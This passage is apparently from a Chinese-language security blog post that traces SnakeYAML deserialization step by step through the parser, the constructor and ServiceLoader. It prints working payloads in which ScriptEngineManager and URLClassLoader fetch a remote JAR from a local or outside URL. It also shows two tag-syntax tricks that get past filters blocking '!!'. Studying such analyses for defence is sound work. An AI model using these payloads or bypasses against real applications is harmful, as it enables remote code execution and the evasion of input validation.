public static final String PREFIX = "tag:yaml.org,2002:";
public static final Tag YAML = new Tag("tag:yaml.org,2002:yaml");
public static final Tag MERGE = new Tag("tag:yaml.org,2002:merge");
public static final Tag SET = new Tag("tag:yaml.org,2002:set");
public static final Tag PAIRS = new Tag("tag:yaml.org,2002:pairs");
public static final Tag OMAP = new Tag("tag:yaml.org,2002:omap");
public static final Tag BINARY = new Tag("tag:yaml.org,2002:binary");
public static final Tag INT = new Tag("tag:yaml.org,2002:int");
public static final Tag FLOAT = new Tag("tag:yaml.org,2002:float");
public static final Tag TIMESTAMP = new Tag("tag:yaml.org,2002:timestamp");
public static final Tag BOOL = new Tag("tag:yaml.org,2002:bool");
public static final Tag NULL = new Tag("tag:yaml.org,2002:null");
public static final Tag STR = new Tag("tag:yaml.org,2002:str");
public static final Tag SEQ = new Tag("tag:yaml.org,2002:seq");
public static final Tag MAP = new Tag("tag:yaml.org,2002:map");
```

而tag具体的替换以及整个payload重新组合的逻辑在`ParserImpl#parseNode()`方法中
[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1835657-20220505160300993-1105587901.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160300993-1105587901.png)

调用栈如下

```avrasm
parseNode:426, ParserImpl (org.yaml.snakeyaml.parser)
access$1300:117, ParserImpl (org.yaml.snakeyaml.parser)
produce:359, ParserImpl$ParseBlockNode (org.yaml.snakeyaml.parser)
peekEvent:158, ParserImpl (org.yaml.snakeyaml.parser)
checkEvent:148, ParserImpl (org.yaml.snakeyaml.parser)
composeNode:136, Composer (org.yaml.snakeyaml.composer)
getNode:95, Composer (org.yaml.snakeyaml.composer)
getSingleNode:119, Composer (org.yaml.snakeyaml.composer)
getSingleData:150, BaseConstructor (org.yaml.snakeyaml.constructor)
loadFromReader:490, Yaml (org.yaml.snakeyaml)
load:416, Yaml (org.yaml.snakeyaml)
```

所以我们之前传入的payload

```lua
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://127.0.0.1:9000/yaml-payload.jar"]
  ]]
]
```

会变为如下的一种形式

```php-template
<org.yaml.snakeyaml.nodes.SequenceNode (tag=tag:yaml.org,2002:javax.script.ScriptEngineManager, value=[<org.yaml.snakeyaml.nodes.SequenceNode (tag=tag:yaml.org,2002:java.net.URLClassLoader, value=[<org.yaml.snakeyaml.nodes.SequenceNode (tag=tag:yaml.org,2002:seq, value=[<org.yaml.snakeyaml.nodes.SequenceNode (tag=tag:yaml.org,2002:java.net.URL, value=[<org.yaml.snakeyaml.nodes.ScalarNode (tag=tag:yaml.org,2002:str, value=http://127.0.0.1:9000/yaml-payload.jar)>])>])>])>])>
```

继续跟进，会执行`return this.constructDocument(node)`从而进入`BaseConstructor#constructDocument`方法，其中调用了`constructObject`方法
[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1835657-20220505160318287-1864887779.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160318287-1864887779.png)

继续跟进后发现，在`constructObjectNoCheck`方法中会去获取对应tag的value，逻辑在`getConstructor`方法内（其中node是我们传入后经过处理的payload）
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160329510-1410857477.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160329510-1410857477.png)

之后调用`Constructor#construct`方法，这里就是关键的地方了
进入后首先调用`getConstuctor`方法
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160341093-107000756.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160341093-107000756.png)

继续跟`getClassForNode`，这里`this.typeTags`为null，所以进入if逻辑内
[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1835657-20220505160352544-952585639.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160352544-952585639.png)

跟进`getClassForName`，最终这里是通过反射获取到`ScriptEngineManager`的一个Class对象
[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1835657-20220505160506325-1450282735.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160506325-1450282735.png)

后续向`typeTags`的Map里put进去了本次tag和class对象的键值对并返回`ScriptEngineManager`这个class对象，后续对`URLClassLoader`和`URL`处理的逻辑基本差不多相同，这里就跳过了
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160517547-1941299817.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160517547-1941299817.png)

当`URL`也被反射拿到class对象后，直接跟到`construct`方法内
[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1835657-20220505160529091-492253327.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160529091-492253327.png)

首先通过反射获取`node`字段的`type`属性值所对应的构造方法
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160547126-1516924078.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160547126-1516924078.png)

[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1835657-20220505160555581-348148410.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160555581-348148410.png)

最终通过`newInstance`方法实例化，这里具体的话分为3步，首先是`URL`的实例化，之后是`URLClassLoader`的实例化，最终实例化`ScriptEngineManager`时才会真正的触发远程代码执行
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160608469-1995249265.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160608469-1995249265.png)

[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160619329-603749240.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160619329-603749240.png)

[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160631176-37076654.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160631176-37076654.png)





## ScriptEngineManager分析[#](https://www.cnblogs.com/CoLo/p/16225141.html#scriptenginemanager分析)

那么我们来跟一下`ScriptEngineManager`，把payload的jar拖到项目依赖中，在`ScriptEngineManager`的构造方法下断点，从`newInstance`处F7即可跟入
[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1835657-20220505160714267-1264595129.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160714267-1264595129.png)

前面都是一些赋值操作，跟进`initEngines`
[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1835657-20220505160725558-604848458.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160725558-604848458.png)

ServiceLoader这里就是用到SPI机制，会通过远程地址寻找`META-INF/services`目录下的`javax.script.ScriptEngineFactory`然后去加载文件中指定的PoC类从而触发远程代码执行
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160737126-1173180753.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160737126-1173180753.png)

跟进`itr.next()`会进入`ServiceLoader$LazyIterator#next()`方法，调用了`nextService`
[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1835657-20220505160749651-1716666553.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160749651-1716666553.png)

继续跟进，先反射获取的class对象，之后newInstance实例化,这里第一次实例化的是`NashornScriptEngineFactory`类，之后第二次会去实例化我们远程jar中的PoC类，从而触发静态代码块/无参构造方法的执行来达到任意代码执行的目的
[![img](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160803855-697465854.png)](https://img2022.cnblogs.com/blog/1835657/202205/1835657-20220505160803855-697465854.png)

[![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1835657-20220505160817191-160532523.png)

# 6. SnakeYaml 反序列化的一个小 trick

浅蓝师傅的总结

**yaml 中带有 !! 无法通过校验，校验的绕过**

每个 !! 修饰过的类都转成了一个 TAG。

例如 yaml 常用的 set str map 等类型都是一个 TAG，并且使用了一个固定的前缀：`tag:yaml.org,2002:`

```java
    public static final String PREFIX = "tag:yaml.org,2002:";
    public static final Tag YAML = new Tag("tag:yaml.org,2002:yaml");
    public static final Tag MERGE = new Tag("tag:yaml.org,2002:merge");
    public static final Tag SET = new Tag("tag:yaml.org,2002:set");
    public static final Tag PAIRS = new Tag("tag:yaml.org,2002:pairs");
    public static final Tag OMAP = new Tag("tag:yaml.org,2002:omap");
    public static final Tag BINARY = new Tag("tag:yaml.org,2002:binary");
    public static final Tag INT = new Tag("tag:yaml.org,2002:int");
    public static final Tag FLOAT = new Tag("tag:yaml.org,2002:float");
    public static final Tag TIMESTAMP = new Tag("tag:yaml.org,2002:timestamp");
    public static final Tag BOOL = new Tag("tag:yaml.org,2002:bool");
    public static final Tag NULL = new Tag("tag:yaml.org,2002:null");
    public static final Tag STR = new Tag("tag:yaml.org,2002:str");
    public static final Tag SEQ = new Tag("tag:yaml.org,2002:seq");
    public static final Tag MAP = new Tag("tag:yaml.org,2002:map");

```

所以 `!!javax.script.ScriptEngineManager` 的TAG就是 `tag:yaml.org,2002:javax.script.ScriptEngineManager`



发现它除了 !! 以为还有另外几种 TAG 的表示方式。

```java
%YAML 1.1
---
!!seq [
  !<!foo> "bar",
  !<tag:yaml.org,2002:str> "string"
  !<tag:ben-kiki.org,2000:type> "baz"
]
 复制
# Explicitly specify default settings:
%TAG !     !
%TAG !!    tag:yaml.org,2002:
# Named handles have no default:
%TAG !o! tag:ben-kiki.org,2000:
---
- !foo "bar"
- !!str "string"
- !o!type "baz"

```

第一种是用`!<TAG>`来表示，只需要一个感叹号，尖括号里就是 TAG。

前面提到 !! 就是用来表示 TAG 的，会自动补全 TAG 前缀`tag:yaml.org,2002:`

所以要想反序列化恶意类就需要这样构造

```java
!<tag:yaml.org,2002:javax.script.ScriptEngineManager> " +
                "[!<tag:yaml.org,2002:java.net.URLClassLoader> [[!<tag:yaml.org,2002:java.net.URL>" +
                " [\"http://b1ue.cn/\"]]]]

```

这样以来就绕过了不允许存在 !! 的限制。

![图片](https://gitee.com/shine05/myblog-gallery/raw/master/img/20210328101448417.png)

再来看第二种，需要在 yaml 中用`%TAG`声明一个 TAG

例如我声明 ! 的tag是 `tag:yaml.org,2002:`

```
%TAG !      tag:yaml.org,2002:

```

后面再调用 `!str`的话实际上就会把 TAG 前缀拼起来得到`tag:yaml.org,2002:str`。

最终我构造的反序列化攻击payload如下

```java
%TAG !      tag:yaml.org,2002:
---
!javax.script.ScriptEngineManager [!java.net.URLClassLoader [[!java.net.URL ["http://b1ue.cn/"]]]]

```

![图片](https://gitee.com/shine05/myblog-gallery/raw/master/img/20210328101610275.png)

同样也只使用了一个!，绕过了!!的限制。

## 参考

1、https://cloud.tencent.com/developer/article/1785056

2、https://blog.csdn.net/u012149894/article/details/85321639

3、https://zhuanlan.zhihu.com/p/82965579

4、https://www.cnblogs.com/nice0e3/p/14514882.html

5、https://www.cnblogs.com/CoLo/p/16225141.html







